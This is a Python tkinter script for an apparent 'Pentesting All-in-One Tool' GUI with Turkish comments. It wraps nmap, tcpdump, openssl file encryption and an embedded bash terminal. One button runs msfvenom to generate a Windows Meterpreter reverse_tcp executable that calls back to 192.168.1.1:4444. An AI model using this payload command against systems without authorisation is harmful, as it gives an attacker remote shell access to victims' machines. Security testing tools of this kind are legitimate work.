import tkinter as tk
from tkinter import scrolledtext
import ptyprocess
import subprocess
import threading
import os


# Ana uygulama penceresi
root = tk.Tk()
root.title("Pentesting All-in-One Tool")
root.geometry("1000x700")

# Sol Üst: All-in-One Tool Manager
def run_nmap_scan():
    output = subprocess.run(["nmap", "scanme.nmap.org"], capture_output=True, text=True)
    terminal_1_output.insert(tk.END, output.stdout)

def run_msf_payload():
    output = subprocess.run(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST=192.168.1.1", "LPORT=4444", "-f", "exe"], capture_output=True, text=True)
    terminal_1_output.insert(tk.END, output.stdout)

def encrypt_file():
    file_path = entry_file.get()
    subprocess.run(["openssl", "aes-256-cbc", "-in", file_path, "-out", file_path + ".enc"])
    terminal_2_output.insert(tk.END, f"File encrypted: {file_path}\n")

# Terminal emulasyonu için komutların işlenmesi
class TerminalEmulator:
    def __init__(self, terminal_text_widget):
        self.terminal_text_widget = terminal_text_widget
        self.pty_proc = ptyprocess.PtyProcess.spawn(['/bin/bash'])

        # Terminal çıktısını GUI'de güncelleme
        self.update_terminal_output()

    def send_command(self, command):
        self.pty_proc.write(command + '\n')

    def update_terminal_output(self):
        if self.pty_proc.isalive():
            try:
                output = self.pty_proc.read().decode('utf-8')
                self.terminal_text_widget.insert(tk.END, output)
                self.terminal_text_widget.see(tk.END)
            except Exception as e:
                pass
        self.terminal_text_widget.after(100, self.update_terminal_output)

# Sol üst: Pentesting Tools bölgesi
frame_tools = tk.Frame(root, bd=2, relief="solid")
frame_tools.place(x=10, y=10, width=380, height=280)

label_tools = tk.Label(frame_tools, text="All-in-One Tool Manager")
label_tools.pack()

btn_nmap = tk.Button(frame_tools, text="Run Nmap Scan", command=run_nmap_scan)
btn_nmap.pack(fill=tk.X)

btn_msf = tk.Button(frame_tools, text="Create MSF Payload", command=run_msf_payload)
btn_msf.pack(fill=tk.X)

# Sağ Üst: Terminal 1
frame_terminal_1 = tk.Frame(root, bd=2, relief="solid")
frame_terminal_1.place(x=400, y=10, width=580, height=280)

label_terminal_1 = tk.Label(frame_terminal_1, text="Terminal 1 (Nmap / MSF Output)")
label_terminal_1.pack()

terminal_1_output = scrolledtext.ScrolledText(frame_terminal_1, wrap=tk.WORD)
terminal_1_output.pack(expand=True, fill=tk.BOTH)

# Sağ Alt: Terminal 2 (Dosya Şifreleme)
frame_terminal_2 = tk.Frame(root, bd=2, relief="solid")
frame_terminal_2.place(x=400, y=300, width=580, height=150)

label_terminal_2 = tk.Label(frame_terminal_2, text="Terminal 2 (File Encryption)")
label_terminal_2.pack()

terminal_2_output = scrolledtext.ScrolledText(frame_terminal_2, wrap=tk.WORD)
terminal_2_output.pack(expand=True, fill=tk.BOTH)

entry_file = tk.Entry(frame_terminal_2)
entry_file.pack(fill=tk.X)

btn_encrypt = tk.Button(frame_terminal_2, text="Encrypt File", command=encrypt_file)
btn_encrypt.pack(fill=tk.X)

# Sol Alt: Ağ Paketleri ve İzleme
def run_tcpdump():
    output = subprocess.run(["tcpdump", "-c", "5"], capture_output=True, text=True)
    network_output.insert(tk.END, output.stdout)

frame_network = tk.Frame(root, bd=2, relief="solid")
frame_network.place(x=10, y=300, width=380, height=280)

label_network = tk.Label(frame_network, text="Network Traffic Monitoring")
label_network.pack()

network_output = scrolledtext.ScrolledText(frame_network, wrap=tk.WORD)
network_output.pack(expand=True, fill=tk.BOTH)

btn_tcpdump = tk.Button(frame_network, text="Capture 5 Packets", command=run_tcpdump)
btn_tcpdump.pack(fill=tk.X)

# Alt Kısım: Normal Terminal
frame_terminal = tk.Frame(root, bd=2, relief="solid")
frame_terminal.place(x=10, y=590, width=970, height=100)

terminal_text = scrolledtext.ScrolledText(frame_terminal, wrap=tk.WORD)
terminal_text.pack(expand=True, fill=tk.BOTH)

terminal_emulator = TerminalEmulator(terminal_text)

# Kullanıcının komut girmesi için alan
entry_command = tk.Entry(root)
entry_command.place(x=10, y=650, width=800, height=30)

def run_command():
    command = entry_command.get()
    terminal_emulator.send_command(command)
    entry_command.delete(0, tk.END)

btn_run_command = tk.Button(root, text="Run Command", command=run_command)
btn_run_command.place(x=820, y=650, width=80, height=30)

# Ana döngü
root.mainloop()